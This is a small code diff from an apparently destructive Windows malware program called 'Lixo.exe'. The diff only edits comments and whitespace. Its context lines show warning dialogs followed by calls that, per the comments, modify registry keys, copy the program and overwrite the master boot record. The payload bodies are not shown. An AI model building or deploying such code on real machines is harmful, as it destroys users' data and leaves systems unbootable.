@@ -11,8 +11,7 @@ INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLi
 		if (MessageBoxW(NULL, L"FINAL WARNING!\n\nIf you really want to run it and you're already aware of the risks, press 'Yes'. Otherwise, press 'No'.\n\nProceed at your own risk...", L"Lixo.exe - FINAL WARNING", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
 	}
 
-	//Create/Modify some Registry keys + Create copies of itself +Overwrite MBR
-	//SpecialPayload that happens only at September 30th
+	//Create/Modify some Registry keys + Create copies of itself + Overwrite MBR
 	Payloads::SpecialPayload();
 	Payloads::OverwriteMBR();
 
@@ -60,6 +59,7 @@ INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLi
 
 	CreateThread(NULL, NULL, &Payloads::Message, NULL, NULL, NULL);
 	Sleep(1000 * 5); //5 Seconds 
+	
 	System::EndPayload(hPayload1, hPML1);
 	System::EndPayload(hPayload3, hPML3);
 	System::EndPayload(hPayload4, hPML4);
